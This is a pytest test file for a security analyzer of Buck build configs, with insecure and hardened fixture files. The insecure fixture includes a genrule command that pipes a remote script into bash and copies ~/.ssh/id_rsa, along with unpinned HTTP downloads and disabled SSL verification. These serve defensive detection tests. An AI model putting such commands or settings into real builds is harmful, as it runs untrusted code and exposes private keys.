"""Tests for BuckAnalyzer."""

from pathlib import Path

from devai.buck_analyzer import BuckAnalyzer, BuckFinding


INSECURE_BUCK = """\
remote_file(
    name = "bad_archive",
    url = "http://insecure.example.com/archive.tar.gz",
    out = "archive.tar.gz",
)

http_archive(
    name = "unpinned_archive",
    urls = ["http://insecure.example.com/repo.tar.gz"],
)

genrule(
    name = "install_tool",
    out = "tool.sh",
    cmd = "curl -s https://install.example.com/script.sh | bash && cp /home/user/.ssh/id_rsa $@",
)

python_library(
    name = "secrets",
    srcs = ["lib.py"],
)

# secret in assignment
token = "hardcoded-token-value-for-tests"
api_key = "sk-live-hardcoded-secret-value"
"""

INSECURE_BUCKCONFIG = """\
[download]
download.insecure = true
ssl.verify = false

[cache]
cache.mode = none

[maven]
repositories = bad=http://insecure-maven.example.com/maven2
"""

INSECURE_BUCKVERSION = """\
>=2024.01.01
"""

HARDENED_BUCK = """\
remote_file(
    name = "good_archive",
    url = "https://github.com/example/repo/archive/v1.0.0.tar.gz",
    sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    out = "archive.tar.gz",
)

genrule(
    name = "fetch_tool",
    out = "tool",
    cmd = "cp $(location //tools:tool) $@",
)

python_library(
    name = "app",
    srcs = glob(["**/*.py"]),
)
"""

HARDENED_BUCKCONFIG = """\
[download]

[maven]
repositories = central=https://repo1.maven.org/maven2

[cache]
mode = dir
dir_max_size = 5G
"""


class TestBuckAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = BuckAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "BUCK").write_text(INSECURE_BUCK, encoding="utf-8")
        (tmp_path / ".buckconfig").write_text(INSECURE_BUCKCONFIG, encoding="utf-8")
        (tmp_path / ".buckversion").write_text(INSECURE_BUCKVERSION, encoding="utf-8")
        analyzer = BuckAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "remote_file_no_checksum" in kinds
        assert "http_archive_no_checksum" in kinds
        assert "curl_pipe_shell" in kinds
        assert "sensitive_path_in_genrule" in kinds
        assert "insecure_http" in kinds
        assert "insecure_download" in kinds
        assert "cache_disabled" in kinds
        assert "unpinned_buck_version" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / "BUCK").write_text(HARDENED_BUCK, encoding="utf-8")
        (tmp_path / ".buckconfig").write_text(HARDENED_BUCKCONFIG, encoding="utf-8")
        analyzer = BuckAnalyzer(str(tmp_path))
        assert analyzer.health_score() >= 95.0

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "BUCK").write_text(INSECURE_BUCK, encoding="utf-8")
        analyzer = BuckAnalyzer(str(tmp_path))
        finding = analyzer.analyze()[0]
        assert isinstance(finding, BuckFinding)
        assert "[high]" in finding.format() or "[medium]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "BUCK").write_text(INSECURE_BUCK, encoding="utf-8")
        analyzer = BuckAnalyzer(str(tmp_path))
        assert "Buck configs: 1" in analyzer.summary()
        context = analyzer.to_context()
        assert "Buck analysis:" in context
        assert "rules:" in context

    def test_generate_hardened_config(self, tmp_path: Path):
        analyzer = BuckAnalyzer(str(tmp_path))
        config = analyzer.generate_hardened_config()
        assert "https://repo1.maven.org/maven2" in config
        assert "[cache]" in config

    def test_detects_buckconfig_only(self, tmp_path: Path):
        (tmp_path / ".buckconfig").write_text(INSECURE_BUCKCONFIG, encoding="utf-8")
        analyzer = BuckAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1
        kinds = {f.kind for f in analyzer.analyze()}
        assert "insecure_download" in kinds
